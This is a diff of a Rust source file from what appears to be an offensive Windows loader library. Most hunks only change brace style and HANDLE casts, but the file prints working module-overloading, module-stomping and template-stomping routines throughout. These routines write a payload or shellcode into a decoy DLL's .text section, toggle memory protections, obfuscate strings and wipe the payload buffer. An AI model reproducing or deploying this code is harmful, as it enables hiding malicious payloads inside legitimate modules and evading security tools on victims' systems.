@@ -28,10 +28,8 @@ fn find_suitable_module(function_size: u32) -> usize
             for section in pe_metadata.sections
             {   
                 let s = std::str::from_utf8(&section.Name).unwrap();
-                if s.contains(".text") 
-                {
-                    unsafe
-                    {
+                if s.contains(".text") {
+                    unsafe {
                         if section.Misc.VirtualSize > function_size {
                             suitable_text_sections.push(module_base_address);
                         }
@@ -90,8 +88,7 @@ pub fn find_decoy_module (min_size: i64) -> String
         let p = entry.unwrap();
         let path = p.path();
 
-        if !path.is_dir() &&  path.to_str().unwrap().ends_with(".dll")
-        {
+        if !path.is_dir() &&  path.to_str().unwrap().ends_with(".dll") {
             let slice:Vec<String> = path.to_str().unwrap().to_string().split("\\").map(str::to_string).collect();
             files.push(slice[slice.len() - 1].to_string());
         }
@@ -103,8 +100,7 @@ pub fn find_decoy_module (min_size: i64) -> String
     for m in modules
     {   
         let mut c = 0;
-        for f in &files
-        {
+        for f in &files {
             if f.to_lowercase() == m.name().unwrap().to_lowercase() {
                 remove.push(c);
             }
@@ -127,8 +123,7 @@ pub fn find_decoy_module (min_size: i64) -> String
         let size = fs::metadata(&path).unwrap().len() as i64;
         if size > (min_size * 2) {
             return path;
-        }
-        else {
+        } else {
             files.remove(r);
         }
     }
@@ -155,18 +150,15 @@ pub fn find_decoy_module (min_size: i64) -> String
 /// ```
 pub fn read_and_overload(payload_path: &str, decoy_module_path: &str) -> Result<(PeMetadata,usize), String>
 {
-
     if !Path::new(payload_path).is_file() {
         return Err(lc!("[x] Payload file not found."));
     }
-
 
     let mut file_content = fs::read(payload_path).expect(&lc!("[x] Error opening the payload file."));
     let result = overload_module(&file_content, decoy_module_path)?;
     let file_content_ptr = file_content.as_mut_ptr();
     
-    unsafe 
-    {
+    unsafe {
         for i in 0..file_content.len() {
             *(file_content_ptr.add(i)) = 0u8;
         }
@@ -198,8 +190,7 @@ pub fn read_and_overload(payload_path: &str, decoy_module_path: &str) -> Result<
 pub fn overload_module (file_content: &Vec<u8>, decoy_module_path: &str) -> Result<(PeMetadata,usize), String> 
 {   
     let mut decoy_module_path = decoy_module_path.to_string();
-    if decoy_module_path != ""
-    {
+    if decoy_module_path != "" {
         if !Path::new(&decoy_module_path).is_file() {
             return Err(lc!("[x] Decoy file not found."));
         }
@@ -208,9 +199,7 @@ pub fn overload_module (file_content: &Vec<u8>, decoy_module_path: &str) -> Resu
         if decoy_content.len() < file_content.len() {
             return Err(lc!("[x] Decoy module is too small to host the payload."));
         }
-    }
-    else
-    {
+    } else {
         decoy_module_path = find_decoy_module(file_content.len() as i64);
         if decoy_module_path == "" {
             return Err(lc!("[x] Failed to find suitable decoy module."));
@@ -218,11 +207,10 @@ pub fn overload_module (file_content: &Vec<u8>, decoy_module_path: &str) -> Resu
         
     }
 
-        let decoy_metadata: (PeManualMap, HANDLE) = manualmap::map_to_section(&decoy_module_path)?;
+    let decoy_metadata: (PeManualMap, HANDLE) = manualmap::map_to_section(&decoy_module_path)?;
+    let result: (PeMetadata,usize) = overload_to_section(file_content, decoy_metadata.0)?;
 
-        let result: (PeMetadata,usize) = overload_to_section(file_content, decoy_metadata.0)?;
-
-        Ok(result)
+    Ok(result)
 }
 
 /// Load a payload from memory to an existing memory section.
@@ -251,8 +239,7 @@ pub fn overload_to_section (file_content: &Vec<u8>, section_metadata: PeManualMa
         let region_size: usize;
         if section_metadata.pe_info.is_32_bit {
             region_size = section_metadata.pe_info.opt_header_32.SizeOfImage as usize;
-        }
-        else {
+        } else {
             region_size = section_metadata.pe_info.opt_header_64.size_of_image as usize;
         }
 
@@ -260,7 +247,7 @@ pub fn overload_to_section (file_content: &Vec<u8>, section_metadata: PeManualMa
         let base_address: *mut PVOID = std::mem::transmute(&section_metadata.base_address);
         let old_protection: *mut u32 = std::mem::transmute(&u32::default());
         let r = dinvoke::nt_protect_virtual_memory(
-            HANDLE { 0: -1}, 
+            HANDLE { 0: -1 as _}, 
             base_address, 
             size, 
             PAGE_READWRITE, 
@@ -340,8 +327,7 @@ pub fn managed_overload_module (file_content: Vec<u8>, decoy_module_path: &str) 
     let mut decoy_module_path = decoy_module_path.to_string();
     let decoy_content;
     
-    if decoy_module_path != ""
-    {
+    if decoy_module_path != "" {
         if !Path::new(&decoy_module_path).is_file() {
             return Err(lc!("[x] Decoy file not found."));
         }
@@ -350,9 +336,7 @@ pub fn managed_overload_module (file_content: Vec<u8>, decoy_module_path: &str) 
         if decoy_content.len() < file_content.len() {
             return Err(lc!("[x] Decoy module is too small to host the payload."));
         }
-    }
-    else
-    {
+    } else {
         decoy_module_path = find_decoy_module(file_content.len() as i64);
         if decoy_module_path == "" {
             return Err(lc!("[x] Failed to find suitable decoy module."));
@@ -360,11 +344,10 @@ pub fn managed_overload_module (file_content: Vec<u8>, decoy_module_path: &str) 
         decoy_content = fs::read(&decoy_module_path).expect(&lc!("[x] Error opening the decoy file."));        
     }
 
-        let decoy_metadata: (PeManualMap, HANDLE) = manualmap::map_to_section(&decoy_module_path)?;
+    let decoy_metadata: (PeManualMap, HANDLE) = manualmap::map_to_section(&decoy_module_path)?;
+    let result: (PeMetadata,usize) = overload_to_section(&file_content, decoy_metadata.0)?;
 
-        let result: (PeMetadata,usize) = overload_to_section(&file_content, decoy_metadata.0)?;
-
-        Ok((decoy_content, result.1))
+    Ok((decoy_content, result.1))
 }
 
 /// Stomp a shellcode on a loaded module.
@@ -439,26 +422,22 @@ pub fn managed_module_stomping(payload_content: &Vec<u8>, mut stomp_address: usi
 {
     unsafe
     {
-        let process_handle = HANDLE(-1);
+        let process_handle = HANDLE(-1 as _);
         let size = payload_content.len() as u32;
-        if size == 0
-        {
+        if size == 0 {
             return Err(lc!("[x] Invalid payload."));
         }
 
         if stomp_address == 0
         {
-            if module_base_address != 0
-            {
+            if module_base_address != 0 {
                 let offset = is_suitable(size, module_base_address);
                 if offset != 0 {
                     stomp_address = module_base_address + offset as usize;
-                }
-                else {
+                } else {
                     return Err(lc!("[x] The selected module is not valid to stomp the payload."));
                 }
-            }
-            else {
+            } else {
                 stomp_address = find_suitable_module(size);
             }
 
@@ -563,14 +542,10 @@ pub fn generate_template(input_file: &str, output_directory: &str) -> Result<(),
 
         let mapped_dll_metadata = manualmap::get_pe_metadata(mapped_dll as _, false).unwrap();
         let entry_point;
-        if mapped_dll_metadata.is_32_bit 
-        {
+        if mapped_dll_metadata.is_32_bit {
            entry_point = mapped_dll + mapped_dll_metadata.opt_header_32.AddressOfEntryPoint as usize;
-        }
-        else 
-        {
+        } else {
            entry_point = mapped_dll + mapped_dll_metadata.opt_header_64.address_of_entry_point as usize;
-  
         }
 
         let mut tls_callback_vas: Vec<usize> = vec![]; 
@@ -580,8 +555,7 @@ pub fn generate_template(input_file: &str, output_directory: &str) -> Result<(),
             let address_of_tls_callback = address.add(24) as *mut usize;
             let mut address_of_tls_callback_array: *mut usize = std::mem::transmute(*address_of_tls_callback);
             
-            while *address_of_tls_callback_array != 0
-            {
+            while *address_of_tls_callback_array != 0 {
                 tls_callback_vas.push(*address_of_tls_callback_array);
                 address_of_tls_callback_array = address_of_tls_callback_array.add(1);
             }
@@ -597,8 +571,7 @@ pub fn generate_template(input_file: &str, output_directory: &str) -> Result<(),
               let text_base_address = mapped_dll as usize + section.VirtualAddress as usize;
               entrypoint_rva = (entry_point as usize - text_base_address) as u32;
   
-              for tls_callback_va in &tls_callback_vas
-              {
+              for tls_callback_va in &tls_callback_vas {
                   let tls_rva = (tls_callback_va - text_base_address) as u32;
                   tls_callbacks_rvas.push(tls_rva);
               }
@@ -643,8 +616,7 @@ pub fn generate_template(input_file: &str, output_directory: &str) -> Result<(),
                 *entrypoint_addr = dll_main_template;
 
                 let callback_template = 0xc3 as u8; // Just a ret; instruction to replace Tls Callbacks
-                for tls_callbacks_rva in tls_callbacks_rvas
-                {
+                for tls_callbacks_rva in tls_callbacks_rvas {
                     let tls_callback_addr = (dll_content_buffer as usize + section.PointerToRawData as usize + tls_callbacks_rva as usize) as *mut u8;
                     *tls_callback_addr = callback_template;
                 }
@@ -720,22 +692,20 @@ pub fn template_stomping(template_path: &str, payload_content: &mut Vec<u8>) -> 
                 let old_protection: *mut u32 = std::mem::transmute(&o);
                 let new_protect: u32 = PAGE_READWRITE;
 
-                let ret = dinvoke::nt_protect_virtual_memory(HANDLE(-1), text_addr_ptr, size, new_protect, old_protection);
+                let ret = dinvoke::nt_protect_virtual_memory(HANDLE(-1 as _), text_addr_ptr, size, new_protect, old_protection);
 
-                if ret != 0
-                {
+                if ret != 0 {
                     let _ = dinvoke::free_library(loaded_dll as isize);
                     return Err(lc!("[x] An error ocurred. Dll released."));
                 }
 
-                let handle = HANDLE(-1);
+                let handle = HANDLE(-1 as _);
                 let written: usize = 0;
                 let nsize = payload_content.len();
                 let buffer: *mut c_void = payload_content.as_mut_ptr() as _;
                 let bytes_written: *mut usize = std::mem::transmute(&written);
                 let ret = dinvoke::nt_write_virtual_memory(handle, text_address, buffer, nsize, bytes_written);
-                if ret != 0
-                {
+                if ret != 0 {
                     let _ = dinvoke::free_library(loaded_dll as isize);
                     return Err(lc!("[x] An error ocurred. Dll released."));
                 }
@@ -750,9 +720,8 @@ pub fn template_stomping(template_path: &str, payload_content: &mut Vec<u8>) -> 
                 let o = u32::default();
                 let old_protection: *mut u32 = std::mem::transmute(&o);
                 let new_protect: u32 = PAGE_EXECUTE_READ;
-                let ret = dinvoke::nt_protect_virtual_memory(HANDLE(-1), text_addr_ptr, size, new_protect, old_protection);
-                if ret != 0
-                {
+                let ret = dinvoke::nt_protect_virtual_memory(HANDLE(-1 as _), text_addr_ptr, size, new_protect, old_protection);
+                if ret != 0 {
                     let _ = dinvoke::free_library(loaded_dll as isize);
                     return Err(lc!("[x] An error ocurred. Dll released."));
                 }
@@ -762,7 +731,6 @@ pub fn template_stomping(template_path: &str, payload_content: &mut Vec<u8>) -> 
         }
 
         Ok((PeMetadata::default(),0))
-
     }
 }
 
@@ -777,13 +745,10 @@ fn relocate_text_section(pe_info: &PeMetadata, image_ptr: *mut c_void, start_add
         let module_memory_base: *mut usize = std::mem::transmute(image_ptr);
         let image_data_directory;
         let image_delta: isize;
-        if pe_info.is_32_bit 
-        {
+        if pe_info.is_32_bit {
             image_data_directory = pe_info.opt_header_32.DataDirectory[5]; // BaseRelocationTable
             image_delta = module_memory_base as isize - pe_info.opt_header_32.ImageBase as isize;
-        }
-        else 
-        {
+        } else {
             image_data_directory = pe_info.opt_header_64.datas_directory[5]; // BaseRelocationTable
             image_delta = module_memory_base as isize - pe_info.opt_header_64.image_base as isize;
         }
@@ -807,23 +772,16 @@ fn relocate_text_section(pe_info: &PeMetadata, image_ptr: *mut c_void, start_add
 
                 if reloc_type != 0
                 {
-                    
-                    if reloc_type == 0x3
-                    {
+                    if reloc_type == 0x3 {
                         let patch_ptr = (module_memory_base as usize + image_base_relocation.VirtualAddress as usize + reloc_patch as usize) as *mut i32;
-                        if reloc_patch as usize >= start_address && reloc_patch as usize <= (end_address - 4)
-                        {
+                        if reloc_patch as usize >= start_address && reloc_patch as usize <= (end_address - 4) {
                             let original_ptr = *patch_ptr;
                             let patch = original_ptr + image_delta as i32;
                             *patch_ptr = patch;
                         }
-                        
-                    }
-                    else 
-                    {
+                    } else {
                         let patch_ptr = (module_memory_base as usize + image_base_relocation.VirtualAddress as usize + reloc_patch as usize) as *mut isize;
-                        if reloc_patch as usize >= start_address && reloc_patch as usize <= (end_address - 8)
-                        {
+                        if reloc_patch as usize >= start_address && reloc_patch as usize <= (end_address - 8) {
                             let original_ptr = *patch_ptr;
                             let patch = original_ptr + image_delta as isize;
                             *patch_ptr = patch;
@@ -834,7 +792,6 @@ fn relocate_text_section(pe_info: &PeMetadata, image_ptr: *mut c_void, start_add
 
             reloc_table_ptr = (reloc_table_ptr as usize + image_base_relocation.SizeOfBlock as usize) as *mut i32;
             next_reloc_table_block = *reloc_table_ptr;
-
         }
     }
 }
